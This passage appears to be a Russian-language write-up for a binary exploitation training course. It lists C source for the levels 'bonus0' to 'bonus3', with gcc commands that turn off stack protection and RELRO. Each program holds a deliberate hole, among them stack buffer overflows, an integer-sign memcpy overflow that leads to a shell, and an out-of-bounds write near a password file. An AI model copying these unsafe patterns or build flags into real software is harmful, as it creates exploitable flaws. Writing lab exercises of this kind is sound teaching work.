    N(int x) : number(x) {}
    void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
    virtual int operator+(N &r) {return number + r.number;}
    virtual int operator-(N &r) {return number - r.number;}

private:

    char annotation[100];
    int number;

};
 
int main(int argc, char **argv)
{

    if(argc < 2) _exit(1);
 
    N *x = new N(5);
    N *y = new N(6);
    N &five = *x, &six = *y;
 
    five.setAnnotation(argv[1]);
 
    return six + five;

}

</pre>
g++ -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="bonus0"></a> 
# bonus0

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdio.h"
#include "string.h"
 
void  p(char *name, char *msg){

  char buf[4096];
 
  puts(msg);
  read(0, buf, sizeof buf);
  *strchr(buf, '\n') = 0;
  strncpy(name, buf, 20);

}
 
void  pp(char *fullname) {

  char last[20];
  char first[20];
 
  p(first, " - ");
  p(last, " - ");
 
  strcpy(fullname, first);
  strcat(fullname, " ");
  strcat(fullname, last);

}
 
int main(int argc, char **argv){

  char fullname[42];
 
  pp(fullname);
  printf("%s\n", fullname);
  return 0;

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector  исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="bonus1"></a> 
# bonus1

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdio.h"
#include "string.h"
#include "unistd.h"
 
int main(int argc, char **argv)
{

    int count = atoi(argv[1]);
    int buf[10];
  
    if(count >= 10 ) return 1;
  
    memcpy(buf, argv[2], count * sizeof(int));
    if(count == 0x574f4c46) {

      execl("/bin/sh", "sh" ,NULL);

    }
    return 0;

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="bonus2"></a> 
# bonus2

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdio.h"
#include "stdlib.h"
#include "string.h"

enum{

    EN,
    FN,
    NL,

};

int language = EN;

struct UserRecord{

    char name[40];
    char password[32];
    int id;

};

void    greetuser(struct UserRecord user){

    char greeting[64];
    switch(language){

        case EN:
                strcpy(greeting, "Hello "); break;
        case FN:
                strcpy(greeting, "Hyvää päivää "); break;
        case NL:
                strcpy(greeting, "Goedemiddag! "); break;

    }

    strcat(greeting, user.name);
    printf("%s\n", greeting);

}

int   main(int argc, char **argv, char **env){

    if(argc != 3) {

        return 1;

    }

    struct UserRecord user = {0};
    strncpy(user.name, argv[1], sizeof(user.name));
    strncpy(user.password, argv[2], sizeof(user.password));

    char *envlang = getenv("LANG");
    if(envlang)

            if(!memcmp(envlang, "fi", 2))

                    language = FN;

            else if(!memcmp(envlang, "nl", 2))

                    language = NL;

    greetuser(user);

}

</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level.c -o level
</details> 

#
###### [вернуться к содержанию](#content)
<a name="bonus3"></a> 
# bonus3

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>

#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include "unistd.h"

#define FILE_PASS "/home/user/end/.pass"

int main(int argc, char **argv){

    FILE *fp = fopen(FILE_PASS, "r");
    struct {char pass[66], msg_err[66]} pwfile = {{0}};
    char ptr[0];

    if(!fp || argc != 2)

            return -1;

    fread(pwfile.pass, 1, 66, fp);
    pwfile.pass[65] = 0;
    ptr[atoi(argv[1])] = 0;
    fread(pwfile.msg_err, 1, 65, fp);
    fclose(fp);

    if(!strcmp(pwfile.pass, argv[1]))

            execl("/bin/sh", "sh", 0);

    else

            puts(pwfile.msg_err);

    return 0;

}

</pre>
gcc -m32 -fno-stack-protector -Wl,-z,norelro исходник_level.c -o level
</details> 



Уязвимость Use-After-Free
https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/